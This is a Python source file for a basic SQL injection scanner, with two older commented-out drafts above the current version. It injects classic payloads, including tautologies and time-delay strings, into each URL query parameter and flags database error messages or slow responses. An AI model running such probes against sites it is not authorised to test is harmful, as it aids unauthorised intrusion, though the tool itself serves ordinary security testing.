# import requests
# from colorama import Fore, Style

# def scan(url):
#     print(Fore.YELLOW + "[SQLi] Scanning for SQL Injection..." + Style.RESET_ALL)
#     payloads = ["'", "' OR '1'='1", '" OR "1"="1']
#     for p in payloads:
#         test_url = f"{url}?id={p}"
#         try:
#             r = requests.get(test_url, timeout=5)
#             if "sql" in r.text.lower() or "error" in r.text.lower():
#                 print(Fore.RED + "[!] SQL Injection Possible!" + Style.RESET_ALL)
#                 return
#         except:
#             continue
#     print(Fore.GREEN + "[+] No SQLi vulnerability." + Style.RESET_ALL)

# import requests
# import time
# from colorama import Fore, Style

# def scan(url, param="id"):
#     print(Fore.YELLOW + "[SQLi] Scanning for SQL Injection..." + Style.RESET_ALL)

#     payloads = [
#         "'", "'--", "' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", "' AND 1=1 --", "' OR sleep(3) --"
#     ]

#     for p in payloads:
#         test_url = f"{url}?{param}={p}"
#         try:
#             start = time.time()
#             r = requests.get(test_url, timeout=10)
#             elapsed = time.time() - start

#             if "sql" in r.text.lower() or "error" in r.text.lower():
#                 print(Fore.RED + f"[!] SQL Injection Possible at: {test_url}" + Style.RESET_ALL)
#                 return
#             elif elapsed > 3:
#                 print(Fore.MAGENTA + f"[!] Time-based Blind SQL Injection at: {test_url}" + Style.RESET_ALL)
#                 return
#         except requests.RequestException:
#             continue

#     print(Fore.GREEN + "[+] No SQLi vulnerability detected." + Style.RESET_ALL)
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style

def scan(url):
    print(Fore.YELLOW + f"[SQLi] Scanning {url} for SQL Injection..." + Style.RESET_ALL)

    payloads = [
        "'", "'--", "' OR '1'='1", '" OR "1"="1',
        "' OR 1=1 --", "' AND 1=1 --", "' OR sleep(3) --", "'; WAITFOR DELAY '0:0:3' --"
    ]

    sql_errors = [
        "you have an error in your sql syntax", "unclosed quotation mark",
        "sqlstate", "warning: mysql", "ora-", "quoted string not properly terminated",
        "mysql_fetch", "num_rows", "unexpected token", "syntax error"
    ]

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    if not query_params:
        print(Fore.BLUE + "[!] No query parameters found. Adding default: ?id=1" + Style.RESET_ALL)
        query_params = {"id": ["1"]}

    vulnerable = False

    for param in query_params:
        for payload in payloads:
            test_params = query_params.copy()
            test_params[param] = payload

            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed_url._replace(query=new_query))

            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=10)
                elapsed = time.time() - start_time
                response_text = response.text.lower()

                if any(err in response_text for err in sql_errors):
                    print(Fore.RED + f"[!] SQL Error Injection Possible at: {test_url}" + Style.RESET_ALL)
                    vulnerable = True
                    break

                if elapsed > 3:
                    print(Fore.MAGENTA + f"[!] Possible Time-Based Blind SQLi at: {test_url} (delay: {elapsed:.2f}s)" + Style.RESET_ALL)
                    vulnerable = True
                    break

            except requests.RequestException as e:
                print(Fore.LIGHTBLACK_EX + f"[-] Request failed for {test_url} ({e})" + Style.RESET_ALL)

    if not vulnerable:
        print(Fore.GREEN + "[+] No SQLi vulnerability detected." + Style.RESET_ALL)

# Example:
# scan("https://example.com/page?id=1&user=admin")
